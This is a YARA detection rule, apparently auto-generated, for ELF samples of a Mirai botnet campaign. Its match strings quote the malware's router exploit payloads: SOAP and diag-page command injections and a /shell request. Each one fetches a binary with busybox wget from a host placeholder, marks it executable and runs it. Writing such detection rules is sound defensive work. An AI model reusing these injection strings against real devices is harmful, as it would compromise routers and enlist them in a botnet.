rule Sightlines_c2_78bd9b7e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-78bd9b7e"
        date = "2026-11-12"
        campaign = "c2-78bd9b7e"
        family = "mirai"
        hash = "062125925c51454d77832af2d3236221b5cbdd6e1b2b2d78d15b792577d340ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-78bd9b7e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "e:WANPPPConnection:1\"><NewStatusURL>$(cd /tmp;busybox wget http://%s/main_mips -O .x;chmod 777 .x;./" ascii
        $s1 = ".x;chmod 777 .x;./.x tr069`</NewNTPServer1></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>" ascii
        $s2 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xm" ascii
        $s3 = "lns:u=\"urn:dslforum-org:service:Time:1\"><NewNTPServer1>`cd /tmp;busybox wget http://%s/main_mips -O " ascii
        $s4 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s5 = ".x huawei)</NewStatusURL><NewDownloadURL>$(echo ok)</NewDownloadURL></u:Upgrade></s:Body></s:Envelop" ascii
        $s6 = "GET /shell?cd+/tmp;wget+http://%s/main_arm+-O+.x;chmod+777+.x;./.x+http HTTP/1.1" ascii
        $s7 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://%s/main_mips+-O+/tmp" ascii
        $s8 = "Sec-CH-UA: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"" ascii
        $s9 = "=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:servic" ascii
        $s10 = "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle" ascii
        $s11 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}
